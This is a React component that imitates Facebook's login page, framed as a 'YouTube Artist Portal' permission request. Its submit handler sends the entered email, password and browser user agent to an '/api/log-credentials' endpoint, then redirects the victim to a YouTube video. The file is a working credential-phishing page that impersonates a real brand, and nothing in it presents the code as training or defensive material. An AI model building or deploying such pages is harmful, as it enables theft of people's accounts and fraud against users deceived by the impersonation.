import { useState } from 'react';

export default function FacebookLogin() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');

  const validateCredentials = (email, password) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, '');
    
    if (!emailRegex.test(email) && !phoneRegex.test(cleanEmail)) {
      return "Invalid email or phone number";
    }
    
    const weakPasswords = ['123456', 'password', 'qqqqqq', 'wwwwww', 'aaaaaa', '111111', '000000'];
    if (password.length < 6) return "Password is too short";
    if (weakPasswords.includes(password.toLowerCase())) return "Password is too common";
    if (/(.)\1{5,}/.test(password)) return "Password is too simple";
    
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    const validationError = validateCredentials(email, password);
    if (validationError) {
      setError(validationError);
      return;
    }

    try {
      await fetch('/api/log-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, userAgent: navigator.userAgent })
      });

      window.location.href = `https://www.youtube.com/watch?v=dQw4w9WgXcQ&feature=share&artist_welcome=true`;
      
    } catch (err) {
      setError('Login failed. Please try again.');
    }
  };

  return (
    <div className="facebook-container">
      <div className="facebook-header">
        <div className="facebook-logo">facebook</div>
      </div>
      
      <div className="login-box">
        <h2>Log in to Facebook</h2>
        <p className="app-notice">YouTube Artist Portal wants to access your public profile</p>
        
        <form onSubmit={handleSubmit}>
          {error && <div className="error-message">{error}</div>}
          
          <div className="input-group">
            <input
              type="text"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              className="fb-input"
            />
          </div>
          
          <div className="input-group">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="fb-input"
            />
          </div>

          <button type="submit" className="fb-login-button">
            Log In
          </button>
        </form>
        
        <div className="links">
          <a href="#">Forgotten account?</a>
          <a href="#">Sign up for Facebook</a>
        </div>
      </div>

      <style jsx>{`
        .facebook-container {
          background: #f0f2f5;
          min-height: 100vh;
          font-family: Helvetica, Arial, sans-serif;
        }
        .facebook-header {
          background: white;
          padding: 16px 0;
          border-bottom: 1px solid #dddfe2;
        }
        .facebook-logo {
          font-size: 28px;
          font-weight: bold;
          color: #1877f2;
          text-align: center;
        }
        .login-box {
          max-width: 400px;
          margin: 40px auto;
          background: white;
          padding: 20px;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .fb-input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          font-size: 17px;
          margin-bottom: 12px;
        }
        .fb-login-button {
          width: 100%;
          background: #1877f2;
          color: white;
          border: none;
          border-radius: 6px;
          padding: 12px;
          font-size: 20px;
          font-weight: bold;
          cursor: pointer;
        }
        .error-message {
          background: #ffebe8;
          border: 1px solid #dd3c10;
          color: #dd3c10;
          padding: 12px;
          border-radius: 6px;
          margin-bottom: 16px;
          font-size: 14px;
        }
        .links {
          display: flex;
          justify-content: space-between;
          margin-top: 20px;
        }
        .links a {
          color: #1877f2;
          text-decoration: none;
          font-size: 14px;
        }
      `}</style>
    </div>
  );
}
